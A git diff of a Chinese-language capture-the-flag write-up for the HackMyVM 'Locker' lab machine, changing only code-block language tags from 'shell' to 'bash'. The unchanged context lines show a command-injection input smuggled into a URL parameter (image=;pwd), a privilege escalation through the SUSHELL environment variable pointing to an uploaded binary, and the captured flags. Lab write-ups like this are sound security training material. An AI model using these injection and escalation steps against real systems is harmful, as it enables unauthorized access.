@@ -53,7 +53,7 @@ Network Distance: 1 hop
 
 查看原始返回
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~]
 └──╼ $http get 192.168.56.111
 HTTP/1.1 200 OK
@@ -101,7 +101,7 @@ for i in range(0, 10):
 
 尝试对参数点进行 fuzz，发现存在命令执行
 
-```shell
+```bash
 ┌─[randark@randark-Parrot]─[~/tmp/HackMyVM-Locker]
 └──╼ $http get http://192.168.56.111/locker.php?image=;pwd
 HTTP/1.1 200 OK
@@ -235,13 +235,13 @@ int main()
 
 编译好之后，上传到靶机，然后设置环境变量
 
-```shell
+```bash
 export SUSHELL=/tmp/a.out
 ```
 
 即可进行提权
 
-```shell
+```bash
 (remote) www-data@locker:/tmp$ export SUSHELL=/tmp/a.out
 (remote) www-data@locker:/tmp$ echo $SUSHELL
 /tmp/a.out
@@ -254,14 +254,14 @@ root
 
 ## user pwned
 
-```shell
+```bash
 root@locker:/home/tolocker# cat user.txt 
 flaglockeryes
 ```
 
 ## root pwned
 
-```shell
+```bash
 root@locker:~# cat root.txt 
 igotroothere
 ```
